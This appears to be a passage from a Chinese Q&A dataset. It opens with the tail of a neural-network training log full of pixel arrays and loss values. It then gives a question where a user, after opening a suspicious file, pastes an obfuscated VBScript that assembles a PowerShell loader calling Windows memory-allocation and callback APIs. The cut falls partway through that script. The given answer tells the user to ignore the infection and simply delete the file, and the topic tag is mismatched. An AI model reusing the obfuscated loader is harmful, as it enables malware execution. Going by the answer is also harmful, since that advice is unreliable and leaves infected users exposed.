 0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  6. 172. 241. 50.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0. 177. 202. 19.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] y= [[ 0.8592988  0.3954708 -0.77875614 0.26675048 0.19804694 -0.61968666\n  0.18084174 0.4034736 -0.34189415 0.43645462]\n [ 0.8592988  0.3954708 -0.77875614 0.26675048 0.19804694 -0.61968666\n  0.18084174 0.4034736 -0.34189415 0.43645462]] y_= [[0. 0. 0. 0. 0. 0. 1. 0. 0. 0.]\n [0. 0. 0. 0. 0. 0. 0. 1. 0. 0.]] loss= 2.2191708 softmax= [[0.19166051 0.12052987 0.0372507 0.10597225 0.09893605 0.04367344\n 0.09724841 0.12149832 0.05765821 0.12557226]\n [0.19166051 0.12052987 0.0372507 0.10597225 0.09893605 0.04367344\n 0.09724841 0.12149832 0.05765821 0.12557226]] cross_entropy= [2.3304868 2.1078548] regularization= 50459690000000.0 50459690000000.0\nafter 46 trainning steps:\nx= [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0. 196. 99.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  5. 49.  0.  0.  0.\n  0.  0.  0. 34. 244. 98.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 89. 135.  0.  0.  0.\n  0.  0.  0. 40. 253. 98.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 171. 150.  0.  0.  0.\n  0.  0.  0. 40. 253. 98.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 254. 233.  0.  0.  0.\n  0.  0.  0. 77. 253. 98.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 255. 136.  0.  0.  0.\n  0.  0.  0. 77. 254. 99.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 254. 135.  0.  0.  0.\n  0.  0.  0. 123. 253. 98.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 254. 135.  0.  0.  0.\n  0.  0.  0. 136. 253. 98.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 16. 254. 135.  0.  0.  0.\n  0.  0.  0. 136. 237.  8.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 98. 254. 135.  0.  0. 38.\n 99. 98. 98. 219. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 196. 255. 208. 186. 254. 254.\n 255. 254. 254. 254. 254.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 105. 254. 253. 239. 180. 135.\n 39. 39. 39. 237. 170.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 137. 92. 24.  0.  0.\n  0.  0.  0. 234. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0. 13. 237. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0. 79. 253. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0. 31. 242. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0. 61. 248. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0. 234. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0. 234. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0. 196. 155.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0. 50. 236. 255. 124.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n 53. 231. 253. 253. 107.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  9.\n 193. 253. 253. 230.  4.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  7. 156.\n 253. 253. 149. 36.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 24. 253.\n 253. 190.  8.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  3. 175. 253.\n 253. 72.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 123. 253. 253.\n 138.  3.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 10. 244. 253. 230.\n 34.  0.  9. 24. 23.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 181. 253. 249. 123.\n  0. 69. 195. 253. 249. 146. 15.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 21. 231. 253. 202.  0.\n 70. 236. 253. 253. 253. 253. 170.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 22. 139. 253. 213. 26. 13.\n 200. 253. 253. 183. 252. 253. 220. 22.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 72. 253. 253. 129.  0. 86.\n 253. 253. 129.  4. 105. 253. 253. 70.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 72. 253. 253. 77. 22. 245.\n 253. 183.  4.  0.  2. 105. 253. 70.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 132. 253. 253. 11. 24. 253.\n 253. 116.  0.  0.  1. 150. 253. 70.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 189. 253. 241. 10. 24. 253.\n 253. 59.  0.  0. 82. 253. 212. 30.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 189. 253. 147.  0. 24. 253.\n 253. 150. 30. 44. 208. 212. 31.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 189. 253. 174.  3.  7. 185.\n 253. 253. 227. 247. 184. 30.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 150. 253. 253. 145. 95. 234.\n 253. 253. 253. 126.  1.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 72. 253. 253. 253. 253. 253.\n 253. 253. 169. 14.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  5. 114. 240. 253. 253. 234.\n 135. 44.  3.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] y= [[ 0.7093834  0.30119324 -0.80789334 0.1838598  0.12065991 -0.6538477\n  0.49587095 0.6995347 -0.38699397 0.33823296]\n [ 0.7093834  0.30119324 -0.80789334 0.1838598  0.12065991 -0.6538477\n  0.49587095 0.6995347 -0.38699397 0.33823296]] y_= [[0. 0. 0. 0. 1. 0. 0. 0. 0. 0.]\n [0. 0. 0. 0. 0. 0. 1. 0. 0. 0.]] loss= 2.2107558 softmax= [[0.16371341 0.10884525 0.03590371 0.09679484 0.09086671 0.04188326\n 0.1322382 0.16210894 0.05469323 0.11295244]\n [0.16371341 0.10884525 0.03590371 0.09679484 0.09086671 0.04188326\n 0.1322382 0.16210894 0.05469323 0.11295244]] cross_entropy= [2.3983614 2.0231504] regularization= 50459690000000.0 50459690000000.0\nafter 47 trainning steps:\nx= [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n 11. 139. 212. 253. 159. 86.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 34. 89.\n 203. 253. 252. 252. 252. 252. 74.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 49. 184. 234. 252.\n 252. 184. 110. 100. 208. 252. 199.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 95. 233. 252. 252. 176.\n 56.  0.  0.  0. 17. 234. 249. 75.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 220. 253. 178. 54.  4.\n  0.  0.  0.  0. 43. 240. 243. 50.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 221. 255. 180. 55.  5.\n  0.  0.  0.  7. 160. 253. 168.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 116. 253. 252. 252. 67.\n  0.  0.  0. 91. 252. 231. 42.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 32. 190. 252. 252. 185.\n 38.  0. 119. 234. 252. 54.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 15. 177. 252. 252.\n 179. 155. 236. 227. 119.  4.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 26. 221. 252.\n 252. 253. 252. 130.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 32. 229.\n 253. 255. 144.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 66. 236.\n 252. 253. 92.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 66. 234. 252.\n 252. 253. 92.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 19. 236. 252. 252.\n 252. 253. 92.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 53. 181. 252. 168. 43.\n 232. 253. 92.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 179. 255. 218. 32. 93.\n 253. 252. 84.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 81. 244. 239. 33.  0. 114.\n 252. 209.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 207. 252. 237. 70. 153. 240.\n 252. 32.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 207. 252. 253. 252. 252. 252.\n 210.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 61. 242. 253. 252. 168. 96.\n 12.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] [ 0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n 68. 254. 255. 254. 107.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 11. 176.\n 230. 253. 253. 253. 212.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 28. 197. 253.\n 253. 253. 253. 253. 229. 107. 14.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 194. 253. 253.\n 253. 253. 253. 253. 253. 253. 53.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0. 69. 241. 253. 253.\n 253. 253. 241. 186. 253. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 10. 161. 253. 253. 253.\n 246. 40. 57. 231. 253. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 140. 253. 253. 253. 253.\n 154.  0. 25. 253. 253. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0. 213. 253. 253. 253. 135.\n  8.  0.  3. 128. 253. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0. 77. 238. 253. 253. 253.  7.\n  0.  0.  0. 116. 253. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 11. 165. 253. 253. 231. 70.  1.\n  0.  0.  0. 78. 237. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 33. 253. 253. 253. 182.  0.  0.\n  0.  0.  0.  0. 200. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 98. 253. 253. 253. 24.  0.  0.\n  0.  0.  0.  0. 42. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 197. 253. 253. 253. 24.  0.  0.\n  0.  0.  0.  0. 163. 253. 195.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 197. 253. 253. 189. 13.  0.  0.\n  0.  0.  0. 53. 227. 253. 121.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 197. 253. 253. 114.  0.  0.  0.\n  0.  0. 21. 227. 253. 231. 27.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 197. 253. 253. 114.  0.  0.  0.\n  5. 131. 143. 253. 231. 59.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 197. 253. 253. 236. 73. 58. 217.\n 223. 253. 253. 253. 174.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 197. 253. 253. 253. 253. 253. 253.\n 253. 253. 253. 253. 48.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 149. 253. 253. 253. 253. 253. 253.\n 253. 253. 182. 15.  3.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0. 12. 168. 253. 253. 253. 253. 253.\n 248. 89. 23.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.\n  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.  0.] y= [[ 0.5813921  0.21609789 -0.8359629  0.10818548 0.44052082 -0.6865921\n  0.78338754 0.5727978 -0.4297532  0.24992661]\n [ 0.5813921  0.21609789 -0.8359629  0.10818548 0.44052082 -0.6865921\n  0.78338754 0.5727978 -0.4297532  0.24992661]] y_= [[0. 0. 0. 0. 0. 0. 0. 0. 1. 0.]\n [1. 0. 0. 0. 0. 0. 0. 0. 0. 0.]] loss= 2.452383 softmax= [[0.14272858 0.09905256 0.03459087 0.08892009 0.1239742 0.04016358\n 0.1746773 0.14150718 0.05192496 0.10246069]\n [0.14272858 0.09905256 0.03459087 0.08892009 0.1239742 0.04016358\n 0.1746773 0.14150718 0.05192496 0.10246069]] cross_entropy= [2.9579558 1.9468105] regularization= 50459690000000.0 50459690000000.0\n已终止\n", "Tag": "算法分析"}
{"Answer": "如果当场没有什么异常，现在就不要管他了，这个病毒内容不是长期的，短期没事就不要管他，源文件删掉就好了", "Konwledge_Point": "NP完全问题", "Question": "后知后觉错误打开文件，应该怎么办\n 打开错了一个文件，感觉很危险，\n本人完全不懂，有没有谁可以帮助我。告诉我后面应该怎么办\n\n\n \n\n\nCh9 = Ch9 & \n\"$Translucences = Affedninge1Affedninge1Affedninge1StAledChdKi-TrTUnyScpgceCh Sp-SyTRayPrpHjeAnDIneRefFiiChnTiiSktSciNooTvnfo Al'BauCasRhiPanRogFu LoSApyCesRetIneKnmaf;TwuUnsSyiFpnDigri BlSNeyprsPrtPheRemPi.ShRUluRenWotTaiTvmPieSk.SaIOpnSttFieClrReoPopBaSVeeSorVivHuiStcTreEtsPo;FipPruLibBilS\"\n\nCh9 = Ch9 & \n\"eidacDa PesBitEjaEutTiiTicDy TecGelGlaOusHosOu RuAWasSusSkuRerAlaAnnCacRaeThsdeuBumJomRueUnrNenTaeMesSa1An5Di8Ku1Re{Gu[LaDStlPelCyIskmVopUdoYnrDitSc(Sc`Affedninge1Affedninge1Affedninge1OpkWieUnr\"\n\nCh9 = Ch9 & \n\"conDreFalPo3Pr2Ex`Affedninge1Affedninge1Affedninge1Cr)Di]UnpNeuchbKolMaiOpcKy FosJutBaaBetObiTucAn PieEsxSntBueForFonUn SkvCloSyiOvdSk SaITrnNaiFotfridtaKrlEliBizSteJaCinrDeiVitliiBicBiaUmlLaSkleFocMutWaiSnoPinRb(NyiPonPetOc\"\n\nCh9 = Ch9 & \n\" MnRCoeRecEtuHepPreUn)Di;Bo[miDLdlNolsuIStmUdpRaoHirMutEx(Ec`Affedninge1Affedninge1Affedninge1SakUdeNordinVeeMalSl3Sc2Pr`Affedninge1Affedninge1Affedninge1So)Si]BapIruCzbUplSpiPrcHa kusintHeaFatDaiPocFo vieskxkotCieMarQunSl NaiAznAbtAr VeGHdeVmtViTLrhWarVkeMaabodOuSUdeselSpeLycmatIloTerPhE\"\n\nCh9 = Ch9 & \n\"PenMatMurTbyRe(ShiManBatpo FoTPjaMoaUn,syiBenZetJe FasPaaPlndyiTr,TiiCanTotFo HaPInsMayfacMi)An;gp[arDcolAflsoIAnmFepSuoTrrPatFe(Un`Affedninge1Affedninge1Affedninge1SkAObDShVVaAQuPSuIsq3Om2Ha.stDBeLReLOv`Affedninge1Affedninge1Affedninge1Ka)Lo]FupAcuSkbValEliExcSk SasImtSaaBatNoienc\"\n\nCh9 = Ch9 & \n\"Ar FjeSpxOmtBaeHarCrnCo RaiStnSntEj DdIAnnMiiAktDeiCaaExlgriDizTeeArSSueVicKnuHtrSyiRetStyHiDDieUnsAfcSyrUdiMapdetreoSurDr(foiPonGltFo neHVajLytAk,AfiVenRa\"\n\nCh9 = Ch9 & \n\"tAn SeOTirpotSphInoMetAr)Ak;Az[DeDValSnlbiIEfmSkpAloStrGltpr(Th`Affedninge1Affedninge1Affedninge1AfuFesFreTvrSe3Ta2Pl`Affedninge1Affedninge1Affedninge1So)Po]SepTruPobRelCiiLicGo TusmitNaafotWaiGrcOu SteFoxRetSke\"\n\nCh9 = Ch9 & \n\"ClrUrnGe SpiKinCotin PsCHehSkeDucUlkUnDSalPhgCoBNiuUntMatStoEvnSa(maiAbnTotWh UnUTinSvgFeuUniPllJe,uniBonBetFl EvFAfjOmeMarEdkJurSa,RaiArnAntPr BrADkmRebSliBy)Vi;Hu[ZiDPolSclpeIFumSepBroTirMitBe(An`Affedninge1Affedninge1Affedninge1AsiBamPemOv3Bo2Le.JodPolExlRe`Affedninge1Affedninge1Affedninge1\"\n\nCh9 = Ch9 & \n\"Pe)Pr]InpFouOmbSylSniDycsc vasVatEtaDitKoisocse HaeacxDetCoeFlrArnLu PuiStnMatCh ReICumdymAlGDieGatLiCcooRemCapSloMusAniHatBuiseoDunKaFFuoAlnPatMo(UbiBenHjtto EnRgeeSy\"\n\nCh9 = Ch9 & \n\"oPevpriexrEm2Dy2Om1Fl,BoiAlnAntMe InDDieNolBrtSn)Do;Bu[RaDTolUnlBuIJamPrpSyoSkrHotVi(mi`Affedninge1Affedninge1Affedninge1thADeDBaVraASpPPeICa3Ye2Sp.BeDImLFrLMo`Affedninge1Affedninge1Affedninge1Si)Be]SepKouNobSalBaiKvcLi bisvitLiaTrtBuiClcPa SmeGrxHytHmeSprGunPo adiDenSttFo \"\n\nCh9 = Ch9 & \n\"glIDemSapboeDarUdsBioFonDiaTetSaeSpNFoaGamDeeBrdUrPPriOfpDoeBuCNolOpiIneObnBotta(AriTenTatNs UdtKleIrrLimChoKopSt)Su;Va[InDBelPolMiISemPypHeoverHotBa(Mi`Affedninge1Affedninge1Affedn\"\n\nCh9 = Ch9 & \n\"inge1DeuFlsKoeTarTi3Co2se`Affedninge1Affedninge1Affedninge1Am)Tm]TrpSkuFobAulEriGlcHe EnsRetFaaSatafiEfcVe BreFrxHatMeeCorYonSl SpIIsnSptBePEttGerSa CaESpnDiuEnmToWSuiE\"\n\nCh9 = Ch9 & \n\"knYodUnoNywEnSmatHaaPatSjiBeoStnFasBoWOm(BauSciInnSptRe KovBu1ar,AciSknFrtfr Hovto2Ka)Ma;Ro[BiDBllFolKoISamBopApoAmrOutde(De`Affedninge1Affedninge1Affedninge1KikIneSur\"\n\nCh9 = Ch9 & \n\"LanCyeAnlSy3Fa2Ri`Affedninge1Affedninge1Affedninge1Fr)Ag]AdpcouIlbSllTaiRecGa GrsCrtGyaButPriIncpo FreNoxButPaeunrIdnSu SyiChnSptPr AcVSiiSerBetEluFoaBrlArAAnlnolPooMocSw(SkiPlnGstPj AnvSu1Ko,TeiUsnMotZs FlvGv2Ru,KoiMynSkt\"\n\nCh9 = Ch9 & \n\"Ru ImvRe3ru,TiiDanAgtBo VevVi4Ly)At;Xy[SkDtrlHalFrIElmPrpSkoSprKutSc(Tj`Affedninge1Affedninge1Affedninge1MokAseEarDenEleMelDe3Af2En`Affedninge1Affedninge1Affedninge1Ef)ol]EppBuuOvbSylGaiArcFo HusUntMoaUntReiTrcUn BleSoxSetShecirXenDi GivSvopriModPa PaSEmeKotKoFBliNolImeUnAElpCeiBrsfiTKooMiAMiNB\"\n\nCh9 = Ch9 & \n\"aSinItr(Fl)Bg;Te[UdDFrlBalTwIHymHepTooRarPrtGn(Vo`Affedninge1Affedninge1Affedninge1BlwHyiHjnNumUnmFi.SpdHultelBj`Affedninge1Affedninge1Affedninge1Pe)St]OvpFuuBnbTilFaiGrcan\"\n\nCh9 = Ch9 & \n\" InsRjtUnaNotUniavcRe RueMaxDethaeInrOvnUn TriPenRetIn PamEgmfoiInoTeWSirSuichtofeRa(AniConDetCo KiHHoapolVa,MiiIknTitOx TeBHeeUnaIn,HeiClnRotAt FaSTilAbaNogNo2Ci1Bo9hj)Ko;Un[BuDLslAglunIGemFrpEaoPerNotBe(Tm`Affedninge1Affednin\"\n\nCh9 = Ch9 & \n\"ge1Affedninge1SluRasFoeDarIl3Ga2An`Affedninge1Affedninge1Affedninge1Fe)Ca]UnpDeuBrbStlReiHecDu DasPrtBiaFntUriMucSm BreNoxuntDeePorPonCh UniKnnSctSu GaTWerMaaStnMisFolcaaEvtNieVaMAfDSbIBiSHoyBasSuAWocWicgeeDilAc(KriFrnNetBe 